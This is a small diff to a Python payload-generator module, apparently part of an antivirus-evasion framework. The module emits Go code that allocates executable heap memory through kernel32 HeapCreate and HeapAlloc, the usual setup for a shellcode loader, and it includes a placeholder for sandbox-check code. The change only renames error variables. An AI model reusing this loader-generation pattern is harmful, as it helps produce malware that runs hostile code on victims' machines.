@@ -134,9 +134,9 @@ class PayloadModule:
             payload_code += heapcreatevariable + " = " + kernel32 + ".NewProc(\"HeapCreate\")\n"
             payload_code += heapallocvariable + " = " + kernel32 + ".NewProc(\"HeapAlloc\")\n)\n"
             payload_code += "func %s(%s uintptr) (uintptr, error) {\n" % (cust_func, size)
-            payload_code += heapcreateout + ", _, " + errorvariable + " := " + heapcreatevariable + ".Call(0x00040000, " + size + ", 0)\n"
+            payload_code += heapcreateout + ", _, " + errorvariabledos + " := " + heapcreatevariable + ".Call(0x00040000, " + size + ", 0)\n"
             payload_code += allocvarout + ", _, " + errorvariabledos + " := " + heapallocvariable + ".Call(" + heapcreateout + ", 0x00000008, " + size + ")\n"
-            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" % (allocvarout, err, allocvarout)
+            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" % (allocvarout, errorvariabledos, allocvarout)
 
         payload_code += "func main() {\n"
         # Sandbox code goes here
